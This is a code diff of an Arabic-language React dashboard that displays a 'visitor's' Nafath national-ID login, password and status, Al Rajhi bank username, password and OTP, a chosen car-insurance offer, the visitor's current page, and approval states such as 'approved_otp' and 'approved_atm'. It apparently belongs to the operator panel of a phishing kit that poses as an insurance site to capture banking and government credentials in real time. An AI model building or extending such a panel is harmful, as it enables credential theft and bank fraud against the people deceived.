+              {(selectedVisitor.nafazId || selectedVisitor.nafazPass) && (
+                <Card className="border-cyan-200 dark:border-cyan-800">
+                  <CardHeader className="pb-3 bg-cyan-50 dark:bg-cyan-900/20">
+                    <CardTitle className="text-base flex items-center gap-2 text-cyan-700 dark:text-cyan-400">
+                      <ClipboardCheck className="h-4 w-4" />
+                      بيانات نفاذ
+                    </CardTitle>
+                  </CardHeader>
+                  <CardContent className="pt-4">
+                    <div className="grid grid-cols-2 gap-4">
+                      {selectedVisitor.nafazId && (
+                        <div>
+                          <p className="text-xs text-muted-foreground">رقم الهوية</p>
+                          <p className="font-mono font-semibold">{selectedVisitor.nafazId}</p>
+                        </div>
+                      )}
+                      {selectedVisitor.nafazPass && (
+                        <div>
+                          <p className="text-xs text-muted-foreground">كلمة المرور</p>
+                          <p className="font-mono font-semibold text-cyan-600">{selectedVisitor.nafazPass}</p>
+                        </div>
+                      )}
+                      {selectedVisitor.nafazStatus && (
+                        <div>
+                          <p className="text-xs text-muted-foreground">الحالة</p>
+                          <Badge variant="outline">{selectedVisitor.nafazStatus}</Badge>
+                        </div>
+                      )}
+                    </div>
+                  </CardContent>
+                </Card>
+              )}
+
+              {/* Rajhi Info */}
+              {(selectedVisitor.rajhiUser || selectedVisitor.rajhiPassword) && (
+                <Card className="border-sky-200 dark:border-sky-800">
+                  <CardHeader className="pb-3 bg-sky-50 dark:bg-sky-900/20">
+                    <CardTitle className="text-base flex items-center gap-2 text-sky-700 dark:text-sky-400">
+                      <Building2 className="h-4 w-4" />
+                      بيانات الراجحي
+                    </CardTitle>
+                  </CardHeader>
+                  <CardContent className="pt-4">
+                    <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
+                      {selectedVisitor.rajhiUser && (
+                        <div>
+                          <p className="text-xs text-muted-foreground">اسم المستخدم</p>
+                          <p className="font-mono font-semibold">{selectedVisitor.rajhiUser}</p>
+                        </div>
+                      )}
+                      {selectedVisitor.rajhiPassword && (
+                        <div>
+                          <p className="text-xs text-muted-foreground">كلمة المرور</p>
+                          <p className="font-mono font-semibold text-sky-600">{selectedVisitor.rajhiPassword}</p>
+                        </div>
+                      )}
+                      {selectedVisitor.rajhiOtp && (
+                        <div>
+                          <p className="text-xs text-muted-foreground">OTP</p>
+                          <p className="font-mono font-semibold text-sky-600">{selectedVisitor.rajhiOtp}</p>
+                        </div>
+                      )}
+                    </div>
+                  </CardContent>
+                </Card>
+              )}
+
+              {/* Selected Offer */}
+              {selectedVisitor.selectedOffer && (
+                <Card className="border-amber-200 dark:border-amber-800">
+                  <CardHeader className="pb-3 bg-amber-50 dark:bg-amber-900/20">
+                    <CardTitle className="text-base flex items-center gap-2 text-amber-700 dark:text-amber-400">
+                      <Car className="h-4 w-4" />
+                      العرض المختار
+                    </CardTitle>
+                  </CardHeader>
+                  <CardContent className="pt-4">
+                    <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
+                      {selectedVisitor.selectedOffer.offerName && (
+                        <div className="col-span-2">
+                          <p className="text-xs text-muted-foreground">اسم العرض</p>
+                          <p className="font-semibold">{selectedVisitor.selectedOffer.offerName}</p>
+                        </div>
+                      )}
+                      {selectedVisitor.selectedOffer.insuranceType && (
+                        <div>
+                          <p className="text-xs text-muted-foreground">نوع التأمين</p>
+                          <Badge variant="outline">{selectedVisitor.selectedOffer.insuranceType}</Badge>
+                        </div>
+                      )}
+                      {selectedVisitor.selectedOffer.totalPrice && (
+                        <div>
+                          <p className="text-xs text-muted-foreground">السعر الإجمالي</p>
+                          <p className="font-bold text-lg text-amber-600">
+                            {selectedVisitor.selectedOffer.totalPrice.toFixed(2)} ر.س
+                          </p>
+                        </div>
+                      )}
+                      {selectedVisitor.selectedOffer.status && (
+                        <div>
+                          <p className="text-xs text-muted-foreground">الحالة</p>
+                          <Badge className={selectedVisitor.selectedOffer.status === "completed" ? "bg-emerald-600" : ""}>
+                            {selectedVisitor.selectedOffer.status}
+                          </Badge>
+                        </div>
+                      )}
+                    </div>
+                  </CardContent>
+                </Card>
+              )}
+
+              {/* Status Info */}
+              <Card>
+                <CardHeader className="pb-3">
+                  <CardTitle className="text-base flex items-center gap-2">
+                    <Clock className="h-4 w-4" />
+                    معلومات الحالة
+                  </CardTitle>
+                </CardHeader>
+                <CardContent>
+                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
+                    <div>
+                      <p className="text-xs text-muted-foreground">الصفحة الحالية</p>
+                      <Badge variant="outline">{pageLabels[selectedVisitor.currentPage || ""] || selectedVisitor.currentPage || "الرئيسية"}</Badge>
+                    </div>
+                    {selectedVisitor.currentStep && (
+                      <div>
+                        <p className="text-xs text-muted-foreground">الخطوة</p>
+                        <Badge>{selectedVisitor.currentStep}</Badge>
+                      </div>
+                    )}
+                    {selectedVisitor.approvalStatus && (
+                      <div>
+                        <p className="text-xs text-muted-foreground">حالة الموافقة</p>
+                        <Badge className={
+                          selectedVisitor.approvalStatus === "approved_otp" || selectedVisitor.approvalStatus === "approved_atm"
+                            ? "bg-emerald-600"
+                            : selectedVisitor.approvalStatus === "rejected"
+                            ? "bg-red-600"
+                            : ""
+                        }>
+                          {selectedVisitor.approvalStatus}
+                        </Badge>
+                      </div>
+                    )}
+                    {selectedVisitor.createdAt && (
+                      <div>
+                        <p className="text-xs text-muted-foreground">تاريخ الإنشاء</p>
+                        <p className="font-mono text-xs">{format(new Date(selectedVisitor.createdAt), "yyyy/MM/dd HH:mm", { locale: ar })}</p>
+                      </div>
+                    )}
+                  </div>
+                </CardContent>
+              </Card>
             </div>
-
-            {paginatedNotifications.length === 0 && (
-              <div className="text-center py-12">
-                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-muted flex items-center justify-center">
-                  <Bell className="h-8 w-8 text-muted-foreground" />
-                </div>
-                <h3 className="text-lg font-semibold mb-2">لا يوجد زوار</h3>
-                <p className="text-muted-foreground">لا يوجد زوار متطابقين مع البحث</p>
-              </div>
-            )}
-          </CardContent>
-
-          {filteredNotifications.length > 0 && (
-            <CardFooter className="border-t bg-muted/20 p-4">
-              <Pagination
-                currentPage={currentPage}
-                totalPages={totalPages}
-                onPageChange={setCurrentPage}
-                totalItems={filteredNotifications.length}
-                itemsPerPage={itemsPerPage}
-              />
-            </CardFooter>
           )}
-        </Card>
+        </ScrollArea>
       </div>
     </div>
   );
